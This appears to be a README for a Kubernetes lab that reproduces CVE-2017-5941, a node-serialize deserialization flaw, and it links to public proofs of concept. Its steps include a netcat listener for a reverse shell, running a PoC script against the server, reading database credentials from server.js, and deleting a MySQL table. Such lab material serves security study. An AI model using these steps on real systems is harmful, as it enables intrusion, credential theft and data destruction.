## CVE-2017-5941
https://nvd.nist.gov/vuln/detail/CVE-2017-5941#range-6741888 \
Target Application: Node \
Software Link: https://www.npmjs.com/package/node-serialize \
Version: 0.0.4 \
Writeup: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ \
Used PoCs: 
* https://packetstormsecurity.com/files/161356/Node.JS-Remote-Code-Execution.html
* https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

### Steps to Reproduce

1- `minikube start` \
2- `kubectl apply -f scenario-1-server.yaml` \
3- Forward port `kubectl port-forward pods/scenario-1-server-deployment-c9b7c56cf-ggvgm 4242:4242` \
4- Listen on port `1234` and your ip for TCP connections like `nc -l 144.122.139.40 1234` \
5- Run poc.py with your ip `./poc.py 144.122.139.40` \
6- Attacker runs `ls` and sees a file named `server.js` which includes database hostname, username, password, database name and important table called `person`
7- Attacker runs `mysql -h mysql-service -u user -p` then inputs the password to access the database \
8- Even though the output of Mysql is not seen, input is sent to the container. With this, the attacker can delete the person table with ease.

### Kubernetes
Check https://learnk8s.io/deploying-nodejs-kubernetes for deployment tutorial